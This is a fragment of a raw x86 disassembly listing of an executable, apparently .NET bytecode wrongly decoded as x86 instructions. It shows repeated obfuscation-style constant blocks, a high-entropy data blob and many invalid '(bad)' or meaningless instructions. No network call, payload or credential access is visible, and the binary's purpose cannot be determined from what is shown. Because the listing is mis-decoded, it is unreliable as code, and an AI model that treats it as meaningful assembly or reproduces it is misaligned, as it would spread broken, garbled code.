  4059fd:	69 20 8e 00 00 00    	imul   $0x8e,(%eax),%esp
  405a03:	61                   	popa
  405a04:	9d                   	popf
  405a05:	fe 09                	decb   (%ecx)
  405a07:	05 00 71 03 00       	add    $0x37100,%eax
  405a0c:	00 01                	add    %al,(%ecx)
  405a0e:	20 13                	and    %dl,(%ebx)
  405a10:	00 00                	add    %al,(%eax)
  405a12:	00 7f 0f             	add    %bh,0xf(%edi)
  405a15:	00 00                	add    %al,(%eax)
  405a17:	04 d3                	add    $0xd3,%al
  405a19:	20 13                	and    %dl,(%ebx)
  405a1b:	00 00                	add    %al,(%eax)
  405a1d:	00 58 47             	add    %bl,0x47(%eax)
  405a20:	69 20 44 00 00 00    	imul   $0x44,(%eax),%esp
  405a26:	61                   	popa
  405a27:	9d                   	popf
  405a28:	fe 09                	decb   (%ecx)
  405a2a:	05 00 71 03 00       	add    $0x37100,%eax
  405a2f:	00 01                	add    %al,(%ecx)
  405a31:	20 14 00             	and    %dl,(%eax,%eax,1)
  405a34:	00 00                	add    %al,(%eax)
  405a36:	7f 0f                	jg     0x405a47
  405a38:	00 00                	add    %al,(%eax)
  405a3a:	04 d3                	add    $0xd3,%al
  405a3c:	20 14 00             	and    %dl,(%eax,%eax,1)
  405a3f:	00 00                	add    %al,(%eax)
  405a41:	58                   	pop    %eax
  405a42:	47                   	inc    %edi
  405a43:	69 20 26 00 00 00    	imul   $0x26,(%eax),%esp
  405a49:	61                   	popa
  405a4a:	9d                   	popf
  405a4b:	fe 09                	decb   (%ecx)
  405a4d:	05 00 71 03 00       	add    $0x37100,%eax
  405a52:	00 01                	add    %al,(%ecx)
  405a54:	20 15 00 00 00 20    	and    %dl,0x20000000
  405a5a:	f4                   	hlt
  405a5b:	00 00                	add    %al,(%eax)
  405a5d:	00 20                	add    %ah,(%eax)
  405a5f:	d6                   	salc
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 61 9d             	add    %ah,-0x63(%ecx)
  405a65:	73 03                	jae    0x405a6a
  405a67:	00 00                	add    %al,(%eax)
  405a69:	0a a2 25 20 01 00    	or     0x12025(%edx),%ah
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fe 09                	decb   (%ecx)
  405a73:	0b 00                	or     (%eax),%eax
  405a75:	a2 25 20 02 00       	mov    %al,0x22025
  405a7a:	00 00                	add    %al,(%eax)
  405a7c:	20 03                	and    %al,(%ebx)
  405a7e:	00 00                	add    %al,(%eax)
  405a80:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  405a86:	25 fe 0e 00 00       	and    $0xefe,%eax
  405a8b:	fe 09                	decb   (%ecx)
  405a8d:	05 00 fe 0c 00       	add    $0xcfe00,%eax
  405a92:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  405a98:	fe 09                	decb   (%ecx)
  405a9a:	05 00 71 03 00       	add    $0x37100,%eax
  405a9f:	00 01                	add    %al,(%ecx)
  405aa1:	20 00                	and    %al,(%eax)
  405aa3:	00 00                	add    %al,(%eax)
  405aa5:	00 7f 10             	add    %bh,0x10(%edi)
  405aa8:	00 00                	add    %al,(%eax)
  405aaa:	04 d3                	add    $0xd3,%al
  405aac:	20 00                	and    %al,(%eax)
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	00 58 47             	add    %bl,0x47(%eax)
  405ab3:	69 20 7c 00 00 00    	imul   $0x7c,(%eax),%esp
  405ab9:	61                   	popa
  405aba:	9d                   	popf
  405abb:	fe 09                	decb   (%ecx)
  405abd:	05 00 71 03 00       	add    $0x37100,%eax
  405ac2:	00 01                	add    %al,(%ecx)
  405ac4:	20 01                	and    %al,(%ecx)
  405ac6:	00 00                	add    %al,(%eax)
  405ac8:	00 20                	add    %ah,(%eax)
  405aca:	41                   	inc    %ecx
  405acb:	00 00                	add    %al,(%eax)
  405acd:	00 20                	add    %ah,(%eax)
  405acf:	61                   	popa
  405ad0:	00 00                	add    %al,(%eax)
  405ad2:	00 61 9d             	add    %ah,-0x63(%ecx)
  405ad5:	fe 09                	decb   (%ecx)
  405ad7:	05 00 71 03 00       	add    $0x37100,%eax
  405adc:	00 01                	add    %al,(%ecx)
  405ade:	20 02                	and    %al,(%edx)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	00 7f 10             	add    %bh,0x10(%edi)
  405ae5:	00 00                	add    %al,(%eax)
  405ae7:	04 d3                	add    $0xd3,%al
  405ae9:	20 02                	and    %al,(%edx)
  405aeb:	00 00                	add    %al,(%eax)
  405aed:	00 58 47             	add    %bl,0x47(%eax)
  405af0:	69 20 29 00 00 00    	imul   $0x29,(%eax),%esp
  405af6:	61                   	popa
  405af7:	9d                   	popf
  405af8:	73 03                	jae    0x405afd
  405afa:	00 00                	add    %al,(%eax)
  405afc:	0a a2 25 20 03 00    	or     0x32025(%edx),%ah
  405b02:	00 00                	add    %al,(%eax)
  405b04:	fe 09                	decb   (%ecx)
  405b06:	0c 00                	or     $0x0,%al
  405b08:	a2 25 20 04 00       	mov    %al,0x42025
  405b0d:	00 00                	add    %al,(%eax)
  405b0f:	20 02                	and    %al,(%edx)
  405b11:	00 00                	add    %al,(%eax)
  405b13:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  405b19:	25 fe 0e 00 00       	and    $0xefe,%eax
  405b1e:	fe 09                	decb   (%ecx)
  405b20:	05 00 fe 0c 00       	add    $0xcfe00,%eax
  405b25:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  405b2b:	fe 09                	decb   (%ecx)
  405b2d:	05 00 71 03 00       	add    $0x37100,%eax
  405b32:	00 01                	add    %al,(%ecx)
  405b34:	20 00                	and    %al,(%eax)
  405b36:	00 00                	add    %al,(%eax)
  405b38:	00 7f 11             	add    %bh,0x11(%edi)
  405b3b:	00 00                	add    %al,(%eax)
  405b3d:	04 d3                	add    $0xd3,%al
  405b3f:	20 00                	and    %al,(%eax)
  405b41:	00 00                	add    %al,(%eax)
  405b43:	00 58 47             	add    %bl,0x47(%eax)
  405b46:	69 20 62 00 00 00    	imul   $0x62,(%eax),%esp
  405b4c:	61                   	popa
  405b4d:	9d                   	popf
  405b4e:	fe 09                	decb   (%ecx)
  405b50:	05 00 71 03 00       	add    $0x37100,%eax
  405b55:	00 01                	add    %al,(%ecx)
  405b57:	20 01                	and    %al,(%ecx)
  405b59:	00 00                	add    %al,(%eax)
  405b5b:	00 20                	add    %ah,(%eax)
  405b5d:	b4 00                	mov    $0x0,%ah
  405b5f:	00 00                	add    %al,(%eax)
  405b61:	20 96 00 00 00 61    	and    %dl,0x61000000(%esi)
  405b67:	9d                   	popf
  405b68:	73 03                	jae    0x405b6d
  405b6a:	00 00                	add    %al,(%eax)
  405b6c:	0a a2 28 11 00 00    	or     0x1128(%edx),%ah
  405b72:	0a fe                	or     %dh,%bh
  405b74:	0e                   	push   %cs
  405b75:	01 00                	add    %eax,(%eax)
  405b77:	fe 09                	decb   (%ecx)
  405b79:	07                   	pop    %es
  405b7a:	00 fe                	add    %bh,%dh
  405b7c:	0c 01                	or     $0x1,%al
  405b7e:	00 81 07 00 00 01    	add    %al,0x1000007(%ecx)
  405b84:	73 12                	jae    0x405b98
  405b86:	00 00                	add    %al,(%eax)
  405b88:	0a 25 fe 09 0a 00    	or     0xa09fe,%ah
  405b8e:	6f                   	outsl  %ds:(%esi),(%dx)
  405b8f:	13 00                	adc    (%eax),%eax
  405b91:	00 0a                	add    %cl,(%edx)
  405b93:	00 25 fe 09 07 00    	add    %ah,0x709fe
  405b99:	71 07                	jno    0x405ba2
  405b9b:	00 00                	add    %al,(%eax)
  405b9d:	01 6f 14             	add    %ebp,0x14(%edi)
  405ba0:	00 00                	add    %al,(%eax)
  405ba2:	0a 00                	or     (%eax),%al
  405ba4:	25 20 00 00 00       	and    $0x20,%eax
  405ba9:	00 6f 15             	add    %ch,0x15(%edi)
  405bac:	00 00                	add    %al,(%eax)
  405bae:	0a 00                	or     (%eax),%al
  405bb0:	25 20 01 00 00       	and    $0x120,%eax
  405bb5:	00 6f 16             	add    %ch,0x16(%edi)
  405bb8:	00 00                	add    %al,(%eax)
  405bba:	0a 00                	or     (%eax),%al
  405bbc:	25 20 01 00 00       	and    $0x120,%eax
  405bc1:	00 6f 17             	add    %ch,0x17(%edi)
  405bc4:	00 00                	add    %al,(%eax)
  405bc6:	0a 00                	or     (%eax),%al
  405bc8:	25 20 00 00 00       	and    $0x20,%eax
  405bcd:	00 6f 18             	add    %ch,0x18(%edi)
  405bd0:	00 00                	add    %al,(%eax)
  405bd2:	0a 00                	or     (%eax),%al
  405bd4:	25 20 00 00 00       	and    $0x20,%eax
  405bd9:	00 6f 19             	add    %ch,0x19(%edi)
  405bdc:	00 00                	add    %al,(%eax)
  405bde:	0a 00                	or     (%eax),%al
  405be0:	25 20 00 00 00       	and    $0x20,%eax
  405be5:	00 6f 1a             	add    %ch,0x1a(%edi)
  405be8:	00 00                	add    %al,(%eax)
  405bea:	0a 00                	or     (%eax),%al
  405bec:	fe 0e                	decb   (%esi)
  405bee:	02 00                	add    (%eax),%al
  405bf0:	fe 09                	decb   (%ecx)
  405bf2:	08 00                	or     %al,(%eax)
  405bf4:	fe 0c 02             	decb   (%edx,%eax,1)
  405bf7:	00 81 0d 00 00 01    	add    %al,0x100000d(%ecx)
  405bfd:	fe 09                	decb   (%ecx)
  405bff:	08 00                	or     %al,(%eax)
  405c01:	71 0d                	jno    0x405c10
  405c03:	00 00                	add    %al,(%eax)
  405c05:	01 28                	add    %ebp,(%eax)
  405c07:	1b 00                	sbb    (%eax),%eax
  405c09:	00 0a                	add    %cl,(%edx)
  405c0b:	fe 0e                	decb   (%esi)
  405c0d:	03 00                	add    (%eax),%eax
  405c0f:	fe 09                	decb   (%ecx)
  405c11:	09 00                	or     %eax,(%eax)
  405c13:	fe 0c 03             	decb   (%ebx,%eax,1)
  405c16:	00 81 0e 00 00 01    	add    %al,0x100000e(%ecx)
  405c1c:	fe 09                	decb   (%ecx)
  405c1e:	00 00                	add    %al,(%eax)
  405c20:	20 0a                	and    %cl,(%edx)
  405c22:	00 00                	add    %al,(%eax)
  405c24:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  405c28:	13 30                	adc    (%eax),%esi
  405c2a:	02 00                	add    (%eax),%al
  405c2c:	5b                   	pop    %ebx
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	00 0a                	add    %cl,(%edx)
  405c31:	00 00                	add    %al,(%eax)
  405c33:	11 00                	adc    %eax,(%eax)
  405c35:	fe 09                	decb   (%ecx)
  405c37:	0a 00                	or     (%eax),%al
  405c39:	28 06                	sub    %al,(%esi)
  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	0a 20                	or     (%eax),%ah
  405c3f:	00 00                	add    %al,(%eax)
  405c41:	00 00                	add    %al,(%eax)
  405c43:	fe 01                	incb   (%ecx)
  405c45:	fe 0e                	decb   (%esi)
  405c47:	00 00                	add    %al,(%eax)
  405c49:	fe 09                	decb   (%ecx)
  405c4b:	04 00                	add    $0x0,%al
  405c4d:	fe 0c 00             	decb   (%eax,%eax,1)
  405c50:	00 81 0c 00 00 01    	add    %al,0x100000c(%ecx)
  405c56:	fe 09                	decb   (%ecx)
  405c58:	04 00                	add    $0x0,%al
  405c5a:	71 0c                	jno    0x405c68
  405c5c:	00 00                	add    %al,(%eax)
  405c5e:	01 39                	add    %edi,(%ecx)
  405c60:	0a 00                	or     (%eax),%al
  405c62:	00 00                	add    %al,(%eax)
  405c64:	20 00                	and    %al,(%eax)
  405c66:	00 00                	add    %al,(%eax)
  405c68:	00 38                	add    %bh,(%eax)
  405c6a:	06                   	push   %es
  405c6b:	00 00                	add    %al,(%eax)
  405c6d:	00 00                	add    %al,(%eax)
  405c6f:	20 01                	and    %al,(%ecx)
  405c71:	00 00                	add    %al,(%eax)
  405c73:	00 00                	add    %al,(%eax)
  405c75:	20 01                	and    %al,(%ecx)
  405c77:	00 00                	add    %al,(%eax)
  405c79:	00 5a 20             	add    %bl,0x20(%edx)
  405c7c:	06                   	push   %es
  405c7d:	00 00                	add    %al,(%eax)
  405c7f:	00 58 fe             	add    %bl,-0x2(%eax)
  405c82:	0e                   	push   %cs
  405c83:	01 00                	add    %eax,(%eax)
  405c85:	fe 09                	decb   (%ecx)
  405c87:	00 00                	add    %al,(%eax)
  405c89:	fe 0c 01             	decb   (%ecx,%eax,1)
  405c8c:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  405c90:	13 30                	adc    (%eax),%esi
  405c92:	02 00                	add    (%eax),%al
  405c94:	26 00 00             	add    %al,%es:(%eax)
  405c97:	00 00                	add    %al,(%eax)
  405c99:	00 00                	add    %al,(%eax)
  405c9b:	00 00                	add    %al,(%eax)
  405c9d:	fe 09                	decb   (%ecx)
  405c9f:	09 00                	or     %eax,(%eax)
  405ca1:	71 0e                	jno    0x405cb1
  405ca3:	00 00                	add    %al,(%eax)
  405ca5:	01 6f 1c             	add    %ebp,0x1c(%edi)
  405ca8:	00 00                	add    %al,(%eax)
  405caa:	0a 00                	or     (%eax),%al
  405cac:	00 fe                	add    %bh,%dh
  405cae:	09 01                	or     %eax,(%ecx)
  405cb0:	00 20                	add    %ah,(%eax)
  405cb2:	12 00                	adc    (%eax),%al
  405cb4:	00 00                	add    %al,(%eax)
  405cb6:	54                   	push   %esp
  405cb7:	fe 09                	decb   (%ecx)
  405cb9:	02 00                	add    (%eax),%al
  405cbb:	20 0e                	and    %cl,(%esi)
  405cbd:	00 00                	add    %al,(%eax)
  405cbf:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  405cc3:	00 13                	add    %dl,(%ebx)
  405cc5:	30 00                	xor    %al,(%eax)
  405cc7:	00 06                	add    %al,(%esi)
  405cc9:	00 00                	add    %al,(%eax)
  405ccb:	00 00                	add    %al,(%eax)
  405ccd:	00 00                	add    %al,(%eax)
  405ccf:	00 28                	add    %ch,(%eax)
  405cd1:	21 00                	and    %eax,(%eax)
  405cd3:	00 06                	add    %al,(%esi)
  405cd5:	2a 00                	sub    (%eax),%al
  405cd7:	00 13                	add    %dl,(%ebx)
  405cd9:	30 03                	xor    %al,(%ebx)
  405cdb:	00 42 01             	add    %al,0x1(%edx)
  405cde:	00 00                	add    %al,(%eax)
  405ce0:	00 00                	add    %al,(%eax)
  405ce2:	00 00                	add    %al,(%eax)
  405ce4:	20 12                	and    %dl,(%edx)
  405ce6:	00 00                	add    %al,(%eax)
  405ce8:	00 8d 0a 00 00 01    	add    %cl,0x100000a(%ebp)
  405cee:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  405cf2:	04 7e                	add    $0x7e,%al
  405cf4:	04 00                	add    $0x0,%al
  405cf6:	00 04 20             	add    %al,(%eax,%eiz,1)
  405cf9:	00 00                	add    %al,(%eax)
  405cfb:	00 00                	add    %al,(%eax)
  405cfd:	fe 06                	incb   (%esi)
  405cff:	11 00                	adc    %eax,(%eax)
  405d01:	00 06                	add    %al,(%esi)
  405d03:	9b                   	fwait
  405d04:	7e 04                	jle    0x405d0a
  405d06:	00 00                	add    %al,(%eax)
  405d08:	04 20                	add    $0x20,%al
  405d0a:	01 00                	add    %eax,(%eax)
  405d0c:	00 00                	add    %al,(%eax)
  405d0e:	fe 06                	incb   (%esi)
  405d10:	18 00                	sbb    %al,(%eax)
  405d12:	00 06                	add    %al,(%esi)
  405d14:	9b                   	fwait
  405d15:	7e 04                	jle    0x405d1b
  405d17:	00 00                	add    %al,(%eax)
  405d19:	04 20                	add    $0x20,%al
  405d1b:	02 00                	add    (%eax),%al
  405d1d:	00 00                	add    %al,(%eax)
  405d1f:	fe 06                	incb   (%esi)
  405d21:	16                   	push   %ss
  405d22:	00 00                	add    %al,(%eax)
  405d24:	06                   	push   %es
  405d25:	9b                   	fwait
  405d26:	7e 04                	jle    0x405d2c
  405d28:	00 00                	add    %al,(%eax)
  405d2a:	04 20                	add    $0x20,%al
  405d2c:	03 00                	add    (%eax),%eax
  405d2e:	00 00                	add    %al,(%eax)
  405d30:	fe 06                	incb   (%esi)
  405d32:	0d 00 00 06 9b       	or     $0x9b060000,%eax
  405d37:	7e 04                	jle    0x405d3d
  405d39:	00 00                	add    %al,(%eax)
  405d3b:	04 20                	add    $0x20,%al
  405d3d:	04 00                	add    $0x0,%al
  405d3f:	00 00                	add    %al,(%eax)
  405d41:	fe 06                	incb   (%esi)
  405d43:	1a 00                	sbb    (%eax),%al
  405d45:	00 06                	add    %al,(%esi)
  405d47:	9b                   	fwait
  405d48:	7e 04                	jle    0x405d4e
  405d4a:	00 00                	add    %al,(%eax)
  405d4c:	04 20                	add    $0x20,%al
  405d4e:	05 00 00 00 fe       	add    $0xfe000000,%eax
  405d53:	06                   	push   %es
  405d54:	1e                   	push   %ds
  405d55:	00 00                	add    %al,(%eax)
  405d57:	06                   	push   %es
  405d58:	9b                   	fwait
  405d59:	7e 04                	jle    0x405d5f
  405d5b:	00 00                	add    %al,(%eax)
  405d5d:	04 20                	add    $0x20,%al
  405d5f:	06                   	push   %es
  405d60:	00 00                	add    %al,(%eax)
  405d62:	00 fe                	add    %bh,%dh
  405d64:	06                   	push   %es
  405d65:	12 00                	adc    (%eax),%al
  405d67:	00 06                	add    %al,(%esi)
  405d69:	9b                   	fwait
  405d6a:	7e 04                	jle    0x405d70
  405d6c:	00 00                	add    %al,(%eax)
  405d6e:	04 20                	add    $0x20,%al
  405d70:	07                   	pop    %es
  405d71:	00 00                	add    %al,(%eax)
  405d73:	00 fe                	add    %bh,%dh
  405d75:	06                   	push   %es
  405d76:	0b 00                	or     (%eax),%eax
  405d78:	00 06                	add    %al,(%esi)
  405d7a:	9b                   	fwait
  405d7b:	7e 04                	jle    0x405d81
  405d7d:	00 00                	add    %al,(%eax)
  405d7f:	04 20                	add    $0x20,%al
  405d81:	08 00                	or     %al,(%eax)
  405d83:	00 00                	add    %al,(%eax)
  405d85:	fe 06                	incb   (%esi)
  405d87:	15 00 00 06 9b       	adc    $0x9b060000,%eax
  405d8c:	7e 04                	jle    0x405d92
  405d8e:	00 00                	add    %al,(%eax)
  405d90:	04 20                	add    $0x20,%al
  405d92:	09 00                	or     %eax,(%eax)
  405d94:	00 00                	add    %al,(%eax)
  405d96:	fe 06                	incb   (%esi)
  405d98:	1d 00 00 06 9b       	sbb    $0x9b060000,%eax
  405d9d:	7e 04                	jle    0x405da3
  405d9f:	00 00                	add    %al,(%eax)
  405da1:	04 20                	add    $0x20,%al
  405da3:	0a 00                	or     (%eax),%al
  405da5:	00 00                	add    %al,(%eax)
  405da7:	fe 06                	incb   (%esi)
  405da9:	1f                   	pop    %ds
  405daa:	00 00                	add    %al,(%eax)
  405dac:	06                   	push   %es
  405dad:	9b                   	fwait
  405dae:	7e 04                	jle    0x405db4
  405db0:	00 00                	add    %al,(%eax)
  405db2:	04 20                	add    $0x20,%al
  405db4:	0b 00                	or     (%eax),%eax
  405db6:	00 00                	add    %al,(%eax)
  405db8:	fe 06                	incb   (%esi)
  405dba:	13 00                	adc    (%eax),%eax
  405dbc:	00 06                	add    %al,(%esi)
  405dbe:	9b                   	fwait
  405dbf:	7e 04                	jle    0x405dc5
  405dc1:	00 00                	add    %al,(%eax)
  405dc3:	04 20                	add    $0x20,%al
  405dc5:	0c 00                	or     $0x0,%al
  405dc7:	00 00                	add    %al,(%eax)
  405dc9:	fe 06                	incb   (%esi)
  405dcb:	1c 00                	sbb    $0x0,%al
  405dcd:	00 06                	add    %al,(%esi)
  405dcf:	9b                   	fwait
  405dd0:	7e 04                	jle    0x405dd6
  405dd2:	00 00                	add    %al,(%eax)
  405dd4:	04 20                	add    $0x20,%al
  405dd6:	0d 00 00 00 fe       	or     $0xfe000000,%eax
  405ddb:	06                   	push   %es
  405ddc:	19 00                	sbb    %eax,(%eax)
  405dde:	00 06                	add    %al,(%esi)
  405de0:	9b                   	fwait
  405de1:	7e 04                	jle    0x405de7
  405de3:	00 00                	add    %al,(%eax)
  405de5:	04 20                	add    $0x20,%al
  405de7:	0e                   	push   %cs
  405de8:	00 00                	add    %al,(%eax)
  405dea:	00 fe                	add    %bh,%dh
  405dec:	06                   	push   %es
  405ded:	0f 00 00             	sldt   (%eax)
  405df0:	06                   	push   %es
  405df1:	9b                   	fwait
  405df2:	7e 04                	jle    0x405df8
  405df4:	00 00                	add    %al,(%eax)
  405df6:	04 20                	add    $0x20,%al
  405df8:	0f 00 00             	sldt   (%eax)
  405dfb:	00 fe                	add    %bh,%dh
  405dfd:	06                   	push   %es
  405dfe:	0c 00                	or     $0x0,%al
  405e00:	00 06                	add    %al,(%esi)
  405e02:	9b                   	fwait
  405e03:	7e 04                	jle    0x405e09
  405e05:	00 00                	add    %al,(%eax)
  405e07:	04 20                	add    $0x20,%al
  405e09:	10 00                	adc    %al,(%eax)
  405e0b:	00 00                	add    %al,(%eax)
  405e0d:	fe 06                	incb   (%esi)
  405e0f:	0e                   	push   %cs
  405e10:	00 00                	add    %al,(%eax)
  405e12:	06                   	push   %es
  405e13:	9b                   	fwait
  405e14:	7e 04                	jle    0x405e1a
  405e16:	00 00                	add    %al,(%eax)
  405e18:	04 20                	add    $0x20,%al
  405e1a:	11 00                	adc    %eax,(%eax)
  405e1c:	00 00                	add    %al,(%eax)
  405e1e:	fe 06                	incb   (%esi)
  405e20:	10 00                	adc    %al,(%eax)
  405e22:	00 06                	add    %al,(%esi)
  405e24:	9b                   	fwait
  405e25:	2a 00                	sub    (%eax),%al
  405e27:	00 e2                	add    %ah,%dl
  405e29:	69 f9 eb ed 7a ae    	imul   $0xae7aedeb,%ecx,%edi
  405e2f:	69 e6 3e de f8 24    	imul   $0x24f8de3e,%esi,%esp
  405e35:	99                   	cltd
  405e36:	61                   	popa
  405e37:	ff                   	lcall  (bad)
  405e38:	da a8 2c 31 cb 3c    	fisubrl 0x3ccb312c(%eax)
  405e3e:	5c                   	pop    %esp
  405e3f:	78 82                	js     0x405dc3
  405e41:	c6 02 ac             	movb   $0xac,(%edx)
  405e44:	e1 a6                	loope  0x405dec
  405e46:	df 86 45 65 6a a2    	filds  -0x5d959abb(%esi)
  405e4c:	2f                   	das
  405e4d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405e4e:	03 cc                	add    %esp,%ecx
  405e50:	5a                   	pop    %edx
  405e51:	4e                   	dec    %esi
  405e52:	be 95 3d dd af       	mov    $0xafdd3d95,%esi
  405e57:	d5 b3                	aad    $0xb3
  405e59:	0c bb                	or     $0xbb,%al
  405e5b:	75 b8                	jne    0x405e15
  405e5d:	2f                   	das
  405e5e:	11 30                	adc    %esi,(%eax)
  405e60:	e7 c0                	out    %eax,$0xc0
  405e62:	96                   	xchg   %eax,%esi
  405e63:	5e                   	pop    %esi
  405e64:	f4                   	hlt
  405e65:	2e 03 14 50          	add    %cs:(%eax,%edx,2),%edx
  405e69:	89 4b 9d             	mov    %ecx,-0x63(%ebx)
  405e6c:	f0 63 cc             	lock arpl %ecx,%esp
  405e6f:	96                   	xchg   %eax,%esi
  405e70:	75 44                	jne    0x405eb6
  405e72:	7f ae                	jg     0x405e22
  405e74:	f9                   	stc
  405e75:	3c 5e                	cmp    $0x5e,%al
  405e77:	2d ed 06 bc 05       	sub    $0x5bc06ed,%eax
  405e7c:	4c                   	dec    %esp
  405e7d:	16                   	push   %ss
  405e7e:	66 9a c8 51 61 06    	lcallw $0x661,$0x51c8
  405e84:	05 36 09 9d c4       	add    $0xc49d0936,%eax
  405e89:	30 10                	xor    %dl,(%eax)
  405e8b:	ce                   	into
  405e8c:	f7 bd 07 c0 ff 5f    	idivl  0x5fffc007(%ebp)
  405e92:	12 8d 34 e7 97 09    	adc    0x997e734(%ebp),%cl
  405e98:	41                   	inc    %ecx
  405e99:	2a 10                	sub    (%eax),%dl
  405e9b:	e4 a1                	in     $0xa1,%al
  405e9d:	3b ae b2 a6 6b e6    	cmp    -0x1994594e(%esi),%ebp
  405ea3:	b9 40 e6 42 31       	mov    $0x3142e640,%ecx
  405ea8:	2e 61                	cs popa
  405eaa:	83 92 87 ca ba bc 2a 	adcl   $0x2a,-0x43453579(%edx)
  405eb1:	4b                   	dec    %ebx
  405eb2:	b7 36                	mov    $0x36,%bh
  405eb4:	9d                   	popf
  405eb5:	db c2                	fcmovnb %st(2),%st
  405eb7:	6a 74                	push   $0x74
  405eb9:	00 3b                	add    %bh,(%ebx)
  405ebb:	88 af 30 f5 89 60    	mov    %ch,0x6089f530(%edi)
  405ec1:	ea f4 f7 d1 36 4b 5c 	ljmp   $0x5c4b,$0x36d1f7f4
  405ec8:	b9 30 fa b7 12       	mov    $0x12b7fa30,%ecx
  405ecd:	9d                   	popf
  405ece:	fc                   	cld
  405ecf:	bf 2d 73 de e5       	mov    $0xe5de732d,%edi
  405ed4:	9e                   	sahf
  405ed5:	e8 29 e8 4e 23       	call   0x238f4703
  405eda:	c6                   	(bad)
  405edb:	3a 1a                	cmp    (%edx),%bl
  405edd:	72 00                	jb     0x405edf
  405edf:	df 84 ab 14 eb 90 37 	filds  0x3790eb14(%ebx,%ebp,4)
  405ee6:	dd 6c 94 30          	(bad) 0x30(%esp,%edx,4)
  405eea:	ca 40 4a             	lret   $0x4a40
  405eed:	10 d2                	adc    %dl,%dl
  405eef:	e1 9a                	loope  0x405e8b
  405ef1:	ed                   	in     (%dx),%eax
  405ef2:	8c e0                	mov    %fs,%eax
  405ef4:	68 7f 1d 49 92       	push   $0x92491d7f
  405ef9:	aa                   	stos   %al,%es:(%edi)
  405efa:	81 3a 38 44 2a ef    	cmpl   $0xef2a4438,(%edx)
  405f00:	42                   	inc    %edx
  405f01:	8f                   	(bad)
  405f02:	d8 4c 16 98          	fmuls  -0x68(%esi,%edx,1)
  405f06:	6e                   	outsb  %ds:(%esi),(%dx)
  405f07:	e9 44 9b 2f f7       	jmp    0xf76ffa50
  405f0c:	1c f3                	sbb    $0xf3,%al
  405f0e:	f9                   	stc
  405f0f:	d2 6c ad 3a          	shrb   %cl,0x3a(%ebp,%ebp,4)
  405f13:	f3 11 e1             	repz adc %esp,%ecx
  405f16:	a8 f1                	test   $0xf1,%al
  405f18:	17                   	pop    %ss
  405f19:	43                   	inc    %ebx
  405f1a:	e9 16 2b 8c d4       	jmp    0xd4cc8a35
  405f1f:	d9 f1                	fyl2x
  405f21:	95                   	xchg   %eax,%ebp
  405f22:	18 b0 2a e9 6a c6    	sbb    %dh,-0x399516d6(%eax)
  405f28:	1e                   	push   %ds
  405f29:	b9 01 00 00 00       	mov    $0x1,%ecx
  405f2e:	03 03                	add    (%ebx),%eax
  405f30:	00 00                	add    %al,(%eax)
  405f32:	00 02                	add    %al,(%edx)
  405f34:	03 00                	add    (%eax),%eax
  405f36:	00 00                	add    %al,(%eax)
  405f38:	05 05 00 00 00       	add    $0x5,%eax
  405f3d:	01 00                	add    %eax,(%eax)
  405f3f:	00 00                	add    %al,(%eax)
  405f41:	05 05 00 00 00       	add    $0x5,%eax
  405f46:	02 03                	add    (%ebx),%al
  405f48:	00 00                	add    %al,(%eax)
  405f4a:	00 06                	add    %al,(%esi)
  405f4c:	06                   	push   %es
  405f4d:	00 00                	add    %al,(%eax)
  405f4f:	00 01                	add    %al,(%ecx)
  405f51:	00 00                	add    %al,(%eax)
  405f53:	00 04 04             	add    %al,(%esp,%eax,1)
  405f56:	00 00                	add    %al,(%eax)
  405f58:	00 02                	add    %al,(%edx)
  405f5a:	03 00                	add    (%eax),%eax
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	07                   	pop    %es
  405f5f:	07                   	pop    %es
  405f60:	00 00                	add    %al,(%eax)
  405f62:	00 01                	add    %al,(%ecx)
  405f64:	00 00                	add    %al,(%eax)
  405f66:	00 05 05 00 00 00    	add    %al,0x5
  405f6c:	02 03                	add    (%ebx),%al
  405f6e:	00 00                	add    %al,(%eax)
  405f70:	00 04 04             	add    %al,(%esp,%eax,1)
  405f73:	00 00                	add    %al,(%eax)
  405f75:	00 01                	add    %al,(%ecx)
  405f77:	00 00                	add    %al,(%eax)
  405f79:	00 04 04             	add    %al,(%esp,%eax,1)
  405f7c:	00 00                	add    %al,(%eax)
  405f7e:	00 02                	add    %al,(%edx)
  405f80:	03 00                	add    (%eax),%eax
  405f82:	00 00                	add    %al,(%eax)
  405f84:	02 02                	add    (%edx),%al
  405f86:	00 00                	add    %al,(%eax)
  405f88:	00 01                	add    %al,(%ecx)
  405f8a:	00 00                	add    %al,(%eax)
  405f8c:	00 05 05 00 00 00    	add    %al,0x5
  405f92:	02 03                	add    (%ebx),%al
  405f94:	00 00                	add    %al,(%eax)
  405f96:	00 01                	add    %al,(%ecx)
  405f98:	01 00                	add    %eax,(%eax)
  405f9a:	00 00                	add    %al,(%eax)
  405f9c:	01 00                	add    %eax,(%eax)
  405f9e:	00 00                	add    %al,(%eax)
  405fa0:	08 08                	or     %cl,(%eax)
  405fa2:	00 00                	add    %al,(%eax)
  405fa4:	00 04 05 09 30 26 f2 	add    %al,-0xdd9cff7(,%eax,1)
  405fab:	74 62                	je     0x40600f
  405fad:	40                   	inc    %eax
  405fae:	00 00                	add    %al,(%eax)
  405fb0:	40                   	inc    %eax
  405fb1:	62 74 f2 26          	bound  %esi,0x26(%edx,%esi,8)
  405fb5:	30 09                	xor    %cl,(%ecx)
  405fb7:	06                   	push   %es
	...
  405fc0:	07                   	pop    %es
  405fc1:	00 00                	add    %al,(%eax)
  405fc3:	00 03                	add    %al,(%ebx)
  405fc5:	03 00                	add    (%eax),%eax
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	08 00                	or     %al,(%eax)
  405fcb:	00 00                	add    %al,(%eax)
  405fcd:	03 03                	add    (%ebx),%eax
  405fcf:	00 00                	add    %al,(%eax)
  405fd1:	00 00                	add    %al,(%eax)
